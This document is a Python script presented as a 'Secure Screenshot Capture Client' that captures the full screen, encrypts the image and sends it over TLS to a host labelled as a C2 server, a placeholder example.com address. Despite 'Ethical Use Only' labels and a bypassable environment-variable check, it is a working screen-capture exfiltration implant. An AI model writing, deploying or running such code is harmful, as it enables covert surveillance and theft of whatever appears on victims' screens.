#!/usr/bin/env python3
"""
Secure Screenshot Capture Client
Author: [Your Name / Organization]
License: Ethical Use Only

Requirements:
- Pillow (PIL) for screenshot capturing
- cryptography for encryption
"""

import os
import sys
import time
import socket
import ssl
import hashlib
import platform
import io
from cryptography.fernet import Fernet
from PIL import ImageGrab  # Windows/macOS/Linux support may vary

# ===== CONFIGURATION =====
AUTHORIZED_C2_SERVER = "your-authorized-server.example.com"
AUTHORIZED_PORT = 443
PSK = "YOUR_COMPANY_PSK_" + time.strftime("%Y%m%d")

# ===== SECURITY =====
def verify_authorization():
    if platform.system().lower() not in ["linux", "windows", "darwin"]:
        sys.exit("Unsupported platform for screenshot")
    if os.getenv("AUTHORIZED_TESTING") != "TRUE":
        sys.exit("Missing authorization environment variable")

class SecureChannel:
    def __init__(self, psk):
        import base64
        self.cipher = Fernet(
            base64.urlsafe_b64encode(
                hashlib.sha256(psk.encode()).digest()
            )
        )

    def encrypt(self, data):
        return self.cipher.encrypt(data)

    def decrypt(self, data):
        return self.cipher.decrypt(data)

def establish_connection():
    try:
        context = ssl.create_default_context()
        context.check_hostname = True
        context.verify_mode = ssl.CERT_REQUIRED

        sock = socket.create_connection((AUTHORIZED_C2_SERVER, AUTHORIZED_PORT), timeout=30)
        secure_sock = context.wrap_socket(sock, server_hostname=AUTHORIZED_C2_SERVER)

        secure_sock.sendall(hashlib.sha256(PSK.encode()).hexdigest().encode())
        if secure_sock.recv(1024) != b"AUTH_OK":
            raise ValueError("Server authentication failed")

        return SecureChannel(PSK), secure_sock
    except Exception as e:
        print(f"Connection error: {str(e)}")
        sys.exit(1)

def capture_screenshot():
    img = ImageGrab.grab()
    buffer = io.BytesIO()
    img.save(buffer, format="PNG")
    return buffer.getvalue()

if __name__ == "__main__":
    print("Screenshot Client - Authorized Use Only")
    verify_authorization()

    channel, conn = establish_connection()
    print(f"Connected to {AUTHORIZED_C2_SERVER} - capturing screenshot...")

    screenshot_data = capture_screenshot()
    encrypted_data = channel.encrypt(screenshot_data)

    # Send length first for receiver to know how much to read
    conn.sendall(len(encrypted_data).to_bytes(4, byteorder='big'))
    conn.sendall(encrypted_data)

    print("Screenshot sent successfully.")
    conn.close()
